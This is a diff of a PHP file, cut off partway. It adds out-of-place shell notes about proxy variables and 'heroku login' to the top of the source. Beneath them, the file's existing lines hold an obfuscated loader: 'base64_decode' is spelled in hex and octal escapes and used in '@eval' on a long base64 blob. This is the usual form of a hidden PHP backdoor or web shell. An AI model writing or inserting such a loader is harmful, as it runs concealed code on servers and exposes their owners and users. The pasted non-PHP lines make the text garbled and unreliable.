@@ -1,4 +1,9 @@
 <?php
+> set HTTP_PROXY=http://proxy.server.com:portnumber
+or
+> set HTTPS_PROXY=https://proxy.server.com:portnumber
+> heroku login
+
 $tdbe4058="\x62\x61\x73\x65\x36\64\x5f\144\145\143\157\144\145";@eval($tdbe4058(
 "Ly9OTXRtTThtMWRRUzUvUlRuNG9mQVdFS1YxYU1jd0wwYnE1NjBPZytUYzI2K2NzQ3VoTStpODdOMDN
 UY052ZU12WVhCTUNrMGRacXlUelJnYXlsZG80WjdUcnl0V3poWHgvUFpLWFFyNmJiWDNjMDE0aDI1ZnV
